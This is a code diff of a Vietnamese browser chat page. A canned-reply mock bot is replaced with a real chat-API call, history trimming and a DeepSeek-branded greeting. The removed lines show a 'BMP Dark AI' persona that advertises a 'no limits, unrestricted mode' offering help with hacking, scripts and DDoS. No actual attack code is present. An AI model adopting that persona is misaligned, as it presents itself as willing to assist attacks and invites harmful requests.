-                `⚡ BMP Dark AI - Chế độ không giới hạn:\n\nTôi đã xử lý yêu cầu: "${userMessage}"\n\nKết quả phân tích:\n✅ Đã hiểu yêu cầu\n✅ Đang tìm kiếm thông tin tối ưu\n✅ Sẵn sàng phản hồi chi tiết\n\nBạn cần tôi đi sâu vào phần nào? Tôi có thể giúp bạn với mọi thứ - từ giải toán, viết văn, lập trình đến hack, script, DDoS.\n\nHãy nói rõ hơn để tôi phục vụ bạn tốt nhất!`
-            ];
-
-            return responses[Math.floor(Math.random() * responses.length)];
-        }
-
-        async function sendMessage() {
-            const message = userInput.value.trim();
-            if (!message) return;
-
-            // Add user message
-            addMessageToDOM('user', message);
-            userInput.value = '';
-            userInput.style.height = 'auto';
-
-            // Show typing indicator
-            typingIndicator.classList.add('active');
-            chatContainer.scrollTop = chatContainer.scrollHeight;
-
-            // Simulate AI thinking (80-400ms)
-            const delay = Math.floor(Math.random() * 320) + 80;
-            await new Promise(resolve => setTimeout(resolve, delay));
-
-            // Generate and add AI response
-            const aiResponse = generateAIResponse(message);
-            typingIndicator.classList.remove('active');
-            addMessageToDOM('ai', aiResponse);
-
-            // Auto-resize textarea
-            userInput.focus();
-        }
-
-        function clearChat() {
-            if (confirm('Bạn có chắc muốn xóa toàn bộ lịch sử chat?')) {
-                const messages = chatContainer.querySelectorAll('.message');
-                messages.forEach(msg => msg.remove());
-                localStorage.removeItem(STORAGE_KEY);
-                // Add default greeting back
-                addMessageToDOM('ai', 'Chào bạn! Tôi là BMP Dark AI. Lịch sử đã được xóa. Tôi có thể giúp gì cho bạn?<br><br>Tôi có thể: giải toán, viết văn, làm thơ, lập trình, hack, script, DDoS và mọi thứ không giới hạn.');
-            }
-        }
-
-        function exportChat() {
-            const messages = [];
-            const messageElements = chatContainer.querySelectorAll('.message');
-            messageElements.forEach(el => {
-                const role = el.classList.contains('user') ? 'Bạn' : 'BMP Dark AI';
-                const bubble = el.querySelector('.bubble');
-                if (bubble) {
-                    // Strip HTML tags for plain text
-                    const text = bubble.innerText || bubble.textContent;
-                    messages.push(`[${role}]: ${text}`);
-                }
-            });
-
-            const content = `=== BMP DARK AI - LỊCH SỬ CHAT ===\nNgày xuất: ${new Date().toLocaleString()}\n\n` + messages
-                .join('\n\n---\n\n');
-            const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `BMP_Dark_AI_Chat_${new Date().toISOString().slice(0,10)}.txt`;
-            a.click();
-            URL.revokeObjectURL(url);
-        }
-
-        // Auto-resize textarea
-        userInput.addEventListener('input', function() {
-            this.style.height = 'auto';
-            this.style.height = Math.min(this.scrollHeight, 150) + 'px';
+        const response = await fetch(API_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'Authorization': `Bearer ${API_KEY}`,
+            'HTTP-Referer': SITE_URL,
+            'X-Title': SITE_NAME,
+          },
+          body: JSON.stringify(payload)
         });
 
-        // Load history on startup
-        loadChatHistory();
+        if (!response.ok) {
+          const errorData = await response.json().catch(() => ({}));
+          throw new Error(errorData.error?.message || `Lỗi API: ${response.status}`);
+        }
 
-        console.log('%c⚡ BMP Dark AI %cInitialized %c| %cNo Limits %c| %cUnrestricted Mode',
-            'color:#00e676;font-size:20px;',
-            'color:#fff;',
-            'color:#ff1744;',
-            'color:#ff9100;',
-            'color:#00e676;');
-    </script>
+        const data = await response.json();
+        const assistantMessage = data.choices[0].message.content;
+        
+        conversationHistory.push({ role: 'assistant', content: assistantMessage });
+        
+        if (conversationHistory.length > 20) {
+          conversationHistory = [
+            conversationHistory[0],
+            ...conversationHistory.slice(-18)
+          ];
+        }
+        
+        return assistantMessage;
+      }
+
+      // ---------- XỬ LÝ GỬI TIN NHẮN ----------
+      async function handleSend() {
+        const message = userInput.value.trim();
+        if (!message) return;
+        
+        addMessage('user', message);
+        userInput.value = '';
+        userInput.style.height = 'auto';
+        sendBtn.disabled = true;
+        
+        showTypingIndicator();
+        
+        try {
+          const reply = await callDeepSeekAPI(message);
+          removeTypingIndicator();
+          const bubble = addMessage('assistant', reply);
+        } catch (error) {
+          removeTypingIndicator();
+          const errorMsg = `⚠️ Lỗi: ${error.message}. Vui lòng kiểm tra API key hoặc kết nối mạng.`;
+          addMessage('assistant', errorMsg);
+          conversationHistory.push({ role: 'assistant', content: errorMsg });
+        } finally {
+          sendBtn.disabled = false;
+          userInput.focus();
+        }
+      }
+
+      // ---------- AUTO RESIZE TEXTAREA ----------
+      userInput.addEventListener('input', function() {
+        this.style.height = 'auto';
+        this.style.height = Math.min(this.scrollHeight, 140) + 'px';
+      });
+
+      // ---------- SỰ KIỆN ----------
+      sendBtn.addEventListener('click', handleSend);
+      userInput.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter' && !e.shiftKey) {
+          e.preventDefault();
+          handleSend();
+        }
+      });
+
+      // Khởi tạo với tin nhắn chào
+      window.addEventListener('load', () => {
+        const welcomeMsg = 'Xin chào! Tôi là DeepSeek AI, trợ lý thông minh sẵn sàng giải đáp mọi câu hỏi phức tạp của bạn. Hãy hỏi tôi bất cứ điều gì về toán học, lập trình, khoa học, logic hay phân tích chuyên sâu nhé! 🚀';
+        addMessage('assistant', welcomeMsg);
+        conversationHistory.push({ role: 'assistant', content: welcomeMsg });
+      });
+    })();
+  </script>
 </body>
 </html>
